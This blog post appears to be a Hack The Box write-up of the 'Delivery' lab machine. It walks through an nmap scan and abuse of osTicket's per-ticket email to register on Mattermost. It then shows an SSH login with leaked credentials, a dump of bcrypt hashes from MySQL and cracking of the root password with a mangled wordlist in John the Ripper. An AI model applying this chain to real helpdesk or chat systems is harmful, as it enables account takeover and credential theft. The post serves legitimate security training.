---
layout: post
title: "Delivery "
lang: en
categories:
  - writeups
tags:
  - security
  - writeups
  - htb
  - eop
  - linux
  - web
date: 2021/05/30 11:44:00
thumbnail: /img/HackTheBox/delivery.png

toc: true
---
# Information



- **Name:** Delivery
- **Profile:** [www.hackthebox.eu](https://app.hackthebox.eu/machines/308)
- **Difficulty:** Easy
- **OS:** Linux
- **Points:** 20

![Delivery](/img/HackTheBox/delivery.png)



## Overview

Install tools used in this WU on BlackArch Linux:

```
$ sudo pacman -S nmap mentalist john
```

## Network enumeration

Port and service scan with nmap:

```
# Nmap 7.91 scan initiated Tue Jan 26 20:17:53 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.222
Nmap scan report for 10.10.10.222
Host is up (0.032s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
8065/tcp open  unknown
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Tue, 26 Jan 2021 13:56:05 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: t7o94xf1fbb87bff1tsup8wjcy
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Tue, 26 Jan 2021 19:27:29 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Date: Tue, 26 Jan 2021 19:27:29 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8065-TCP:V=7.91%I=7%D=1/26%Time=60106AFC%P=x86_64-unknown-linux-gnu
SF:%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(GetRequest,DF3,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ran
SF:ges:\x20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20pu
SF:blic\r\nContent-Length:\x203108\r\nContent-Security-Policy:\x20frame-an
SF:cestors\x20'self';\x20script-src\x20'self'\x20cdn\.rudderlabs\.com\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\x20Tue,\x
SF:2026\x20Jan\x202021\x2013:56:05\x20GMT\r\nX-Frame-Options:\x20SAMEORIGI
SF:N\r\nX-Request-Id:\x20t7o94xf1fbb87bff1tsup8wjcy\r\nX-Version-Id:\x205\
SF:.30\.0\.5\.30\.1\.57fb31b889bf81d99d8af8176d4bbaaa\.false\r\nDate:\x20T
SF:ue,\x2026\x20Jan\x202021\x2019:27:29\x20GMT\r\n\r\n<!doctype\x20html><h
SF:tml\x20lang=\"en\"><head><meta\x20charset=\"utf-8\"><meta\x20name=\"vie
SF:wport\"\x20content=\"width=device-width,initial-scale=1,maximum-scale=1
SF:,user-scalable=0\"><meta\x20name=\"robots\"\x20content=\"noindex,\x20no
SF:follow\"><meta\x20name=\"referrer\"\x20content=\"no-referrer\"><title>M
SF:attermost</title><meta\x20name=\"mobile-web-app-capable\"\x20content=\"
SF:yes\"><meta\x20name=\"application-name\"\x20content=\"Mattermost\"><met
SF:a\x20name=\"format-detection\"\x20content=\"telephone=no\"><link\x20re"
SF:)%r(HTTPOptions,5B,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDat
SF:e:\x20Tue,\x2026\x20Jan\x202021\x2019:27:29\x20GMT\r\nContent-Length:\x
SF:200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerC
SF:ookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 26 20:19:44 2021 -- 1 IP address (1 host up) scanned in 111.16 seconds
```

## Web discovery

On http://10.10.10.222/ we can see a link to http://helpdesk.delivery.htb/ and
another one http://delivery.htb:8065/.

So we can set an entry for this local domain:

```
$ cat /etc/hosts | grep delivery
10.10.10.222 helpdesk.delivery.htb
10.10.10.222 delivery.htb
```

At http://helpdesk.delivery.htb/ the software running is [osTicket](https://osticket.com/).

We can find the [source code](https://github.com/osTicket/osTicket) online, it may be
more efficient to find page than enumerating with ffuf.

## Web exploitation

Create a new ticket.

The app tell you you have an email address: 8902868@delivery.htb

Now you can go on the Mattermost page (port 8065) and register using
the email we received and a random password.

`8902868@delivery.htb` / `password1234A!`

http://delivery.htb:8065/should_verify_email?email=8902868%40delivery.htb

Mattermost will send you a registration check link by email.

So refresh the ticket page, eg. http://helpdesk.delivery.htb/tickets.php?id=8902868

And a new message appeared with the content of the registration mail:

```
---- Registration Successful ---- Please activate your email by going to: http://delivery.htb:8065/do_verify_email?token=rboda3gqxmnesjgrrt89kb5hriekno18hr8wqpar53km93q4mg5dsj63g31tujaq&email=8902868%40delivery.htb
```

We can use the link to validate our account and then login to Mattermost.

The idea is that some companies will will automatically accepts registrations
on the internal chat app from emails with a `@company` domain for their employees
but some services like a issue tracker, support panel, will be configured
to automatically generate an email address for each issue that the user can
read and receive some account validation links and gain unauthorized access
to the internal chat app.

The home page contains two messages, the first one gives us credentials that are working
over ssh:

> @developers Please update theme to the OSTicket before we go live.  Credentials to the server are maildeliverer:Youve_G0t_Mail!
>
> Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"

The second message must be a hint for the following steps:

> PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.

## System exploitation

Grab the user flag:

```
$ ssh maildeliverer@10.10.10.222

maildeliverer@Delivery:~$ id
uid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer)

maildeliverer@Delivery:~$ cat user.txt
4aa9052226e3c4d3d653259d524f1fa9
```

What have we in the user directory?

```
maildeliverer@Delivery:~$ ls -lhA
total 5.4M
lrwxrwxrwx 1 root          root             9 Dec 28 07:04 .bash_history -> /dev/null
-rw-r--r-- 1 maildeliverer maildeliverer  220 Dec 26 09:01 .bash_logout
-rw-r--r-- 1 maildeliverer maildeliverer 3.5K Dec 26 09:01 .bashrc
drwx------ 3 maildeliverer maildeliverer 4.0K Dec 28 06:58 .gnupg
-rw------- 1 maildeliverer maildeliverer  230 Jan 26 15:39 .mysql_history
-rw-r--r-- 1 maildeliverer maildeliverer  807 Dec 26 09:01 .profile
-r-------- 1 maildeliverer maildeliverer   33 Jan 26 14:32 user.txt

maildeliverer@Delivery:~$ cat .mysql_history
show databases;
use mattermost;
show tables;
select * from users;
select * from Users;
select Username, Password from Users;
show databases
;
use mattermost
show tables
;
select * from Users;
select Username, Password from Users;
```

Let's find the mattermost install directory it must contains some SQL credentials
where we could use to dump the same table as in our mysql history.

```
maildeliverer@Delivery:~$ find / -name mattermost -type d 2>/dev/null
/opt/mattermost
/var/lib/mysql/mattermost
```

We can find there is a SQL section in the configuration:

```
maildeliverer@Delivery:~$ grep -i sql /opt/mattermost/config/config.json
    "SqlSettings": {
        "DriverName": "mysql",
```

Let's open the file with less, search `SqlSettings`, and see:

```json
    "SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
        "DataSourceReplicas": [],
        "DataSourceSearchReplicas": [],
        "MaxIdleConns": 20,
        "ConnMaxLifetimeMilliseconds": 3600000,
        "MaxOpenConns": 300,
        "Trace": false,
        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
        "QueryTimeout": 30,
        "DisableDatabaseSearch": false
    }
```

It seems we have the creds of the DB in `DataSource`.

So we can connect to it and do the same as in our history:

```
maildeliverer@Delivery:~$ mysql -u mmuser -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 488
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use mattermost;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mattermost]> select Username, Password from Users;
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| duomox                           | $2a$10$ehf6UdxrQX4MHIfe8ohIhe4k.IvQ89gvpg4UVjYrkonki9Vy3j9Qq |
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| moi                              | $2a$10$1huj5gajGm0lofKJDwx5iOVwlxXlyts1LFfpM6YcGMiaAK7KE1Ee2 |
| one                              | $2a$10$5b5xCPsSvpVQ7Ed.LA/UnOcv7ag4FHJ1ZWV4j/VEBb9y4XBBy3ywW |
| user1234                         | $2a$10$LcxQKEkWX82gx8cIHT46tOklDQVYh.BVIfeFGH3gMMkxvyarjysqe |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| lopes                            | $2a$10$x1IJFMel6US3MUP.CdLm.eC0WAt3jx8xDt/4Mwr475H3zD3WnkwSy |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
| one1                             | $2a$10$p/0e8pFihTZBHZmPb1mv6O553J5/oWythXgXYO4Zg1aDe2ZDjyCTq |
+----------------------------------+--------------------------------------------------------------+
13 rows in set (0.000 sec)
```

Let's try to crack the root account. The hint told us not to try rockyou but to
use some mangling rules on the word `PleaseSubscribe!`.

With the tool mentalist I created a mangling rule for JtR:

`root.mentalist`

```json
{"nodes": [{"attributes": [{"class_name": "StringListAttr", "kwargs": {"strings": ["PleaseSubscribe!"], "label": "String: 'PleaseSubscribe!'"}}], "type_": "base"}, {"attributes": [{"class_name": "RangeAttr", "kwargs": {"start": 0, "end": 101, "zfill": 0, "label": "Numbers: Small 0-100"}}], "type_": "Append"}], "version": "1.0"}
```

I took the string in input and appended a short list of numbers and then exported
the full wordlist: root.txt.

Then we can crack it with JtR:

```
$ john --format=bcrypt hash.txt --wordlist=root.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
PleaseSubscribe!21 (root)
1g 0:00:00:01 DONE (2021-01-30 19:22) 0.7751g/s 27.90p/s 27.90c/s 27.90C/s PleaseSubscribe!0..PleaseSubscribe!35
Use the "--show" option to display all of the cracked passwords reliably
```

So we got the root password and can connect with `su`.

```
maildeliverer@Delivery:~$ su root
Password:
root@Delivery:/home/maildeliverer# cd
root@Delivery:~# cat root.txt
2d7cd15d8e1a89279b08dc5948dab25d
```

## Bonus

ippsec contacted me to mention the presence of `/root/note.txt` which explains
why he created the box:

```
I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I've seen several times. The inspiration for the box is here:

- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c

Keep on hacking! And please don't forget to subscribe to all the security streamers out there.

- ippsec
```
